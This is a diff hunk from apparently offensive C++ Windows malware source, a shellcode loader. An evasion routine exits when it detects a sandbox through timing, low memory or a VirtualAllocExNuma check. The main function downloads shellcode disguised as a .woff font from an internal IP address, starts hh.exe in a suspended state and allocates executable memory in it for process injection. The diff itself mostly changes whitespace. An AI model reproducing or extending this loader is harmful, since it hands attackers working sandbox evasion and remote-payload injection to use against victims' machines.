@@ -125,34 +125,28 @@ void evade() {
     end.HighPart = endTime.dwHighDateTime;
     ULONGLONG elapsedTime = end.QuadPart - start.QuadPart;
     elapsedTime /= 10000000;
-
     if (elapsedTime < 1.5) {
         exit(0);
     }
-
 	MEMORYSTATUSEX statex;
 	statex.dwLength = sizeof(statex);
-
 	GlobalMemoryStatusEx(&statex);
-
 	ULONGLONG totalPhysicalMemoryInGB = statex.ullTotalPhys / (1024 * 1024 * 1024);
-
 	if (totalPhysicalMemoryInGB <= 1) {
 		exit(1);
 	}
-
     CheckVirtualAllocExNuma();  
 };
 
 int main() {
     evade();
-	std::vector<BYTE> payload;
-	LPCWSTR url = L"http://10.0.0.47/shellcode.woff";
-	STARTUPINFOA si = { 0 };
-	PROCESS_INFORMATION pi = { 0 };
+    std::vector<BYTE> payload;
+    LPCWSTR url = L"http://10.0.0.47/shellcode.woff";
+    STARTUPINFOA si = { 0 };
+    PROCESS_INFORMATION pi = { 0 };
     pwCreateProcess("C:\\Windows\\hh.exe", NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi);
-	HANDLE victimProcess = pi.hProcess;
-	HANDLE threadHandle = pi.hThread;
+    HANDLE victimProcess = pi.hProcess;
+    HANDLE threadHandle = pi.hThread;
     LPVOID shellAddress = pwVirtualAllocEx(victimProcess, NULL, payload.size(), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
     PVOID pBaseAddress = nullptr;
     SIZE_T* bytesWritten = 0;
